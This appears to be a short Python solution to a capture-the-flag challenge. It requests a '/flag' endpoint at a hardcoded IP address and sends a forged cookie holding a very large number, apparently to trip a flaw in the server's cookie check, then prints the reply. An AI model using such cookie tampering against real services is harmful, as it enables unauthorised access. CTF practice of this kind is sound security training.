#!/usr/bin/python3
import requests

# 100000000000000000000

url = "http://35.225.2.44:5001/flag"
cookies = {
  "cookies": "100000000000000000000"
}

r = requests.get(url, cookies=cookies)

print(r.text)

